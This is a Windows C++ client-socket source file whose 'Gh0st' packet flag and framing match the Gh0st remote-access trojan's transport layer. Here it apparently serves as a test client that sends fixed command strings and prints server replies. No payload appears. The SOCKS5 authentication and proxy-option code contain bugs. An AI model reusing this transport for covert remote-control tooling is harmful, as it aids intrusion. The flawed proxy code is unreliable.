// ClientSocket.cpp: implementation of the CClientSocket class.
//
//////////////////////////////////////////////////////////////////////

#include "ClientSocket.h"
#include <process.h>
#include <MSTcpIP.h>
#pragma comment(lib, "ws2_32.lib")

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

int		CClientSocket::m_nProxyType = PROXY_NONE;
char	CClientSocket::m_strProxyHost[256] = {0};
UINT	CClientSocket::m_nProxyPort = 1080;
char	CClientSocket::m_strUserName[256] = {0};
char	CClientSocket::m_strPassWord[256] = {0};

CClientSocket::CClientSocket()
{
	WSADATA wsaData;
 	WSAStartup(MAKEWORD(2, 2), &wsaData);
	m_hEvent = CreateEvent(NULL, true, false, NULL);
	m_bIsRunning = false;
	m_Socket = INVALID_SOCKET;
	// Packet Flag;
	BYTE bPacketFlag[] = {'G', 'h', '0', 's', 't'};
	memcpy(m_bPacketFlag, bPacketFlag, sizeof(bPacketFlag));
	m_iTotalRecvCount=0;
}

CClientSocket::~CClientSocket()
{
	m_bIsRunning = false;
	WaitForSingleObject(m_hWorkerThread, INFINITE);

	if (m_Socket != INVALID_SOCKET)
		Disconnect();

	CloseHandle(m_hWorkerThread);
	CloseHandle(m_hEvent);
	WSACleanup();
}

bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
{
	// 一定要清除一下，不然socket会耗尽系统资源
	Disconnect();
	// 重置事件对像
	ResetEvent(m_hEvent);
	m_bIsRunning = false;

	if (m_nProxyType != PROXY_NONE && m_nProxyType != PROXY_SOCKS_VER4 && m_nProxyType != PROXY_SOCKS_VER5)
		return false;
	m_Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 

	if (m_Socket == SOCKET_ERROR)   
	{ 
		return false;   
	}

	hostent* pHostent = NULL;
	if (m_nProxyType != PROXY_NONE)
		pHostent = gethostbyname(m_strProxyHost);
	else
		pHostent = gethostbyname(lpszHost);

	if (pHostent == NULL)
		return false;
	
	// 构造sockaddr_in结构
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
	if (m_nProxyType != PROXY_NONE)
		ClientAddr.sin_port	= htons(m_nProxyPort);
	else
		ClientAddr.sin_port	= htons(nPort);

	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);

	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)   
		return false;
// 禁用Nagle算法后，对程序效率有严重影响
// The Nagle algorithm is disabled if the TCP_NODELAY option is enabled 
//   const char chOpt = 1;
// 	int nErr = setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));

	// 验证socks5服务器
	if (m_nProxyType == PROXY_SOCKS_VER5 && !ConnectProxyServer(lpszHost, nPort))
	{
		return false;
	}
	//// 不用保活机制，自己用心跳实瑞
	//
	//const char chOpt = 1; // True
	//// Set KeepAlive 开启保活机制, 防止服务端产生死连接
	//if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
	//{
	//	// 设置超时详细信息
	//	tcp_keepalive	klive;
	//	klive.onoff = 1; // 启用保活
	//	klive.keepalivetime = 1000 * 60 * 3; // 3分钟超时 Keep Alive
	//	klive.keepaliveinterval = 1000 * 5; // 重试间隔为5秒 Resend if No-Reply
	//	WSAIoctl
	//		(
	//		m_Socket, 
	//		SIO_KEEPALIVE_VALS,
	//		&klive,
	//		sizeof(tcp_keepalive),
	//		NULL,
	//		0,
	//		(unsigned long *)&chOpt,
	//		0,
	//		NULL
	//		);
	//}

	m_bIsRunning = true;
	//m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);

	
	//发数据线程
	HANDLE hWorker;
	UINT  nThreadID;
	hWorker = (HANDLE)_beginthreadex(NULL,					// Security
									0,						// Stack size - use default
									SendDataThread,     		// Thread fn entry point
									(void*) m_Socket,			// Param for thread
									0,						// Init flag
									&nThreadID);			// Thread address	
	
	Sleep(1000);
	//收数据线程
	m_hWorkerThread = (HANDLE)_beginthreadex(NULL, 0,WorkThread, (LPVOID)this, 0, NULL);

	return true;
}



bool CClientSocket::ConnectProxyServer(LPCTSTR lpszHost, UINT nPort)
{
		struct timeval tvSelect_Time_Out;
		tvSelect_Time_Out.tv_sec = 3;
		tvSelect_Time_Out.tv_usec = 0;
		fd_set fdRead;
		int	nRet = SOCKET_ERROR;

		char buff[600];
		struct socks5req1 m_proxyreq1;
		m_proxyreq1.Ver = PROXY_SOCKS_VER5;
		m_proxyreq1.nMethods = 2;
		m_proxyreq1.Methods[0] = 0;
		m_proxyreq1.Methods[1] = 2;
		send(m_Socket, (char *)&m_proxyreq1, sizeof(m_proxyreq1), 0);
		struct socks5ans1 *m_proxyans1;
		m_proxyans1 = (struct socks5ans1 *)buff;
		memset(buff, 0, sizeof(buff));

		
		FD_ZERO(&fdRead);
		FD_SET(m_Socket, &fdRead);
		nRet = select(0, &fdRead, NULL, NULL, &tvSelect_Time_Out);
		
		if (nRet <= 0)
		{
			closesocket(m_Socket);
			return false;
		}
		recv(m_Socket, buff, sizeof(buff), 0);
		if(m_proxyans1->Ver != 5 || (m_proxyans1->Method !=0 && m_proxyans1->Method != 2))
		{
			closesocket(m_Socket);
			return false;
		}
		
		
		if(m_proxyans1->Method == 2 && strlen(m_strUserName) > 0)
		{
			int nUserLen = strlen(m_strUserName);
			int nPassLen = strlen(m_strPassWord);
			struct authreq m_authreq;
			memset(&m_authreq, 0, sizeof(m_authreq));
			m_authreq.Ver = PROXY_SOCKS_VER5;
			m_authreq.Ulen = nUserLen;
			lstrcpy(m_authreq.NamePass, m_strUserName);
			memcpy(m_authreq.NamePass + nUserLen, &nPassLen, sizeof(int));
			lstrcpy(m_authreq.NamePass + nUserLen + 1, m_strPassWord);
			
			int len = 3 + nUserLen + nPassLen;
			
			send(m_Socket, (char *)&m_authreq, len, 0);
			
			struct authans *m_authans;
			m_authans = (struct authans *)buff;
			memset(buff, 0, sizeof(buff));

			FD_ZERO(&fdRead);
			FD_SET(m_Socket, &fdRead);
			nRet = select(0, &fdRead, NULL, NULL, &tvSelect_Time_Out);
			
			if (nRet <= 0)
			{
				closesocket(m_Socket);
				return false;
			}

			recv(m_Socket, buff, sizeof(buff), 0);
			if(m_authans->Ver != 5 || m_authans->Status != 0)
			{
				closesocket(m_Socket);
				return false;
			}
		}
		
		hostent* pHostent = gethostbyname(lpszHost);
		if (pHostent == NULL)
			return false;
		
		struct socks5req2 m_proxyreq2;
		m_proxyreq2.Ver = 5;
		m_proxyreq2.Cmd = 1;
		m_proxyreq2.Rsv = 0;
		m_proxyreq2.Atyp = 1;
		m_proxyreq2.IPAddr = * (ULONG*) pHostent->h_addr_list[0];
		m_proxyreq2.Port = ntohs(nPort);
		
		send(m_Socket, (char *)&m_proxyreq2, 10, 0);
		struct socks5ans2 *m_proxyans2;
		m_proxyans2 = (struct socks5ans2 *)buff;
		memset(buff, 0, sizeof(buff));

		FD_ZERO(&fdRead);
		FD_SET(m_Socket, &fdRead);
		nRet = select(0, &fdRead, NULL, NULL, &tvSelect_Time_Out);
		
		if (nRet <= 0)
		{
			closesocket(m_Socket);
			return false;
		}

		recv(m_Socket, buff, sizeof(buff), 0);
		if(m_proxyans2->Ver != 5 || m_proxyans2->Rep != 0)
		{
			closesocket(m_Socket);
			return false;
		}

		return true;
}


char* getPrintTime(char *timeOut)
{
	SYSTEMTIME st, lt;
	GetSystemTime(&st);
	//char currentTime[20] = "";
	sprintf(timeOut,"%d:%d:%d %d",st.wHour, st.wMinute, st.wSecond , st.wMilliseconds);
	return timeOut;
}
//
unsigned CClientSocket::SendDataThread(LPVOID lparam)
{
	SOCKET sRecSocket = (SOCKET)lparam;
	char cTest[11] = "Gh0st00000";
	int iSended = 0;
	int iResult;


    const char alphanum[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
	const int dimon = 1000;
	const int size = 30;
	char **data =  new char*[dimon*size];

	for (int i = 0; i < dimon; i++) {
		data[i]=new char[size];
		memset(data[i],0,size);
	}
	

	//for (int i = 0; i < dimon; i++) {
	//	memcpy(data[i],"ECHO Gh0st",10);
	//	for (int j = 10; j < size-2; j++) {
	//		data[i][j] =alphanum[rand() % (sizeof(alphanum) - 1)];
	//	}
	//	data[i][size-2]='\r';
	//	data[i][size-1]='\n';
 //   }

	for (int i = 0; i < dimon; i++) {
		//memcpy(data[i],"ECHO Gh0st111222333999999888\r\n",30);   // 30个字符必须填满
		//memcpy(data[i],"CHECK Gh0st\r\n",30);
		//memcpy(data[i],"START Gh0st1112223336666666666666666\r\n",30);
		//memcpy(data[i],"START Gh0st111222333\r\n",30);
		//memcpy(data[i],"ECHO:Gh0st,111222333,9999998\r\n",30);
		memcpy(data[i],"<cmd>GETNAP Gh0st 111222</cmd>",30);
	}


	char currentTime[20] = "";
	
	do{
		char request[30];

		//memcpy(request,&cTest,11);
		memcpy(request,data[iSended],30);
		int iLen =30;
		iResult = send(sRecSocket, request, 30, 0 );

		iSended++;

		if (iResult == SOCKET_ERROR) {
			printf("send failed with error: %d\n", WSAGetLastError());
			closesocket(sRecSocket);
			WSACleanup();
			return -1;
		}
		getPrintTime(currentTime);
		printf("Sent this content %s with this bytes : %ld at time %s\n",data[iSended-1], iResult,currentTime);

	}while(iSended<20);

	Sleep(5000);

	// send get all client state command 
	char request[23];
	memcpy(request,"<cmd>GETALLCLIENT</cmd>",23);
	iResult = send(sRecSocket, request,23, 0 );





	return -1;
}

unsigned CClientSocket::WorkThread(LPVOID lparam)   
{
	CClientSocket *pThis = (CClientSocket *)lparam;
	char	buff[MAX_RECV_BUFFER];
	fd_set fdSocket;
	FD_ZERO(&fdSocket);
	FD_SET(pThis->m_Socket, &fdSocket);
	while (pThis->IsRunning())
	{
		fd_set fdRead = fdSocket;
		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
		if (nRet == SOCKET_ERROR)
		{
			pThis->Disconnect();
			break;
		}
		if (nRet > 0)
		{
			memset(buff, 0, sizeof(buff));
			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
			if (nSize <= 0)
			{
				pThis->Disconnect();
				break;
			}
			if (nSize > 0) pThis->OnRead((LPBYTE)buff, nSize);
		}
	}

	return -1;
}

void CClientSocket::run_event_loop()
{
	WaitForSingleObject(m_hEvent, INFINITE);
}

bool CClientSocket::IsRunning()
{
	return m_bIsRunning;
}

void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
{
	try
	{
		if (dwIoSize == 0)
		{
			Disconnect();
			return;
		}
		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
		{
			// 重新发送	
			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
			return;
		}
		// Add the message to out message
		// Dont forget there could be a partial, 1, 1 or more + partial mesages
		m_CompressionBuffer.Write(lpBuffer, dwIoSize);

		char currentTime[20] = "";
		// Check real Data
		while (m_CompressionBuffer.GetBufferLen() > HDR_SIZE)
		{
			BYTE bPacketFlag[FLAG_SIZE];
			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
			
			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
				throw "bad buffer";
			
			int nSize = 0;
			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));
			

				int nUnCompressLength = 0;
				// Read off header
				//m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
				////////////////////////////////////////////////////////
				////////////////////////////////////////////////////////
				// SO you would process your data here
				// 
				// I'm just going to post message so we can see the data
				
				PBYTE pData =NULL;
				if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
				{
					m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
					m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
					 pData = new BYTE[nSize];
					m_CompressionBuffer.Read(pData, nSize);
							
				
				}




				//PBYTE pData = new BYTE[20];


				//m_CompressionBuffer.Read(pData, 20);
				
				////////////////////////////////////////////////////////////////////////////
				//unsigned long	destLen = nUnCompressLength;
				//int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
				////////////////////////////////////////////////////////////////////////////
				//if (nRet == Z_OK)
				//{
				//	m_DeCompressionBuffer.ClearBuffer();
				//	m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
				//	//m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
				//}
				//else
				//	throw "bad buffer";

				getPrintTime(currentTime);
				printf("receive from server : %s at time %s\n",pData,currentTime);
				m_iTotalRecvCount++;
				printf("total recv count is  : %d\n",m_iTotalRecvCount);



				delete [] pData;


		}
	}catch(...)
	{
		m_CompressionBuffer.ClearBuffer();
		Send(NULL, 0);
	}

}

void CClientSocket::Disconnect()
{
    //
    // If we're supposed to abort the connection, set the linger value
    // on the socket to 0.
    //
    LINGER lingerStruct;
    lingerStruct.l_onoff = 1;
    lingerStruct.l_linger = 0;
    setsockopt(m_Socket, SOL_SOCKET, SO_LINGER, (char *)&lingerStruct, sizeof(lingerStruct) );

	CancelIo((HANDLE) m_Socket);
	InterlockedExchange((LPLONG)&m_bIsRunning, false);
	closesocket(m_Socket);
	
	SetEvent(m_hEvent);	

	m_Socket = INVALID_SOCKET;
}

int CClientSocket::Send( LPBYTE lpData, UINT nSize )
{

	m_WriteBuffer.ClearBuffer();

	if (nSize > 0)
	{
		// Compress data
		unsigned long	destLen = (double)nSize * 1.001  + 12;
		LPBYTE			pDest = new BYTE[destLen];

		if (pDest == NULL)
			return 0;

		//int	nRet = compress(pDest, &destLen, lpData, nSize);
		//
		//if (nRet != Z_OK)
		//{
		//	delete [] pDest;
		//	return -1;
		//}
		
		//////////////////////////////////////////////////////////////////////////
		LONG nBufLen = destLen + HDR_SIZE;
		// 5 bytes packet flag
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		// 4 byte header [Size of Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nBufLen, sizeof(nBufLen));
		// 4 byte header [Size of UnCompress Entire Packet]
		m_WriteBuffer.Write((PBYTE) &nSize, sizeof(nSize));
		// Write Data
		m_WriteBuffer.Write(pDest, destLen);
		delete [] pDest;
		
		// 发送完后，再备份数据, 因为有可能是m_ResendWriteBuffer本身在发送,所以不直接写入
		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
		CopyMemory(lpResendWriteBuffer, lpData, nSize);
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// 备份发送的数据
		if (lpResendWriteBuffer)
			delete [] lpResendWriteBuffer;
	}
	else // 要求重发, 只发送FLAG
	{
		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
		m_ResendWriteBuffer.ClearBuffer();
		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// 备份发送的数据	
	}

	// 分块发送
	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
}


int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
{
	int			nRet = 0;
	const char	*pbuf = (char *)lpData;
	int			size = 0;
	int			nSend = 0;
	int			nSendRetry = 15;
	// 依次发送
	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
	{
		int i =0;
		for ( i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, pbuf, nSplitSize, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		
		nSend += nRet;
		pbuf += nSplitSize;
		Sleep(10); // 必要的Sleep,过快会引起控制端数据混乱
	}
	// 发送最后的部分
	if (size > 0)
	{
		int i = 0;
		for (i = 0; i < nSendRetry; i++)
		{
			nRet = send(m_Socket, (char *)pbuf, size, 0);
			if (nRet > 0)
				break;
		}
		if (i == nSendRetry)
			return -1;
		nSend += nRet;
	}
	if (nSend == nSize)
		return nSend;
	else
		return SOCKET_ERROR;
}

void CClientSocket::setManagerCallBack( CManager *pManager )
{
	//m_pManager = pManager;
}

void CClientSocket::setGlobalProxyOption( int nProxyType /*= PROXY_NONE*/, LPCTSTR lpszProxyHost /*= NULL*/, 
										 UINT nProxyPort /*= 1080*/, LPCTSTR lpszUserName /*= NULL*/, LPCSTR lpszPassWord /*= NULL*/ )
{
	memset(m_strProxyHost, 0, sizeof(m_strProxyHost));
	memset(m_strUserName, 0, sizeof(m_strUserName));
	memset(m_strPassWord, 0, sizeof(m_strPassWord));

	m_nProxyType = nProxyType;
	if (lpszProxyHost != NULL)
		lstrcpy(m_strProxyHost, lpszProxyHost);

	m_nProxyPort = nProxyPort;
	if (m_strUserName != NULL)
		lstrcpy(m_strUserName, lpszUserName);
	if (m_strPassWord != NULL)
		lstrcpy(m_strPassWord, lpszPassWord);
}
	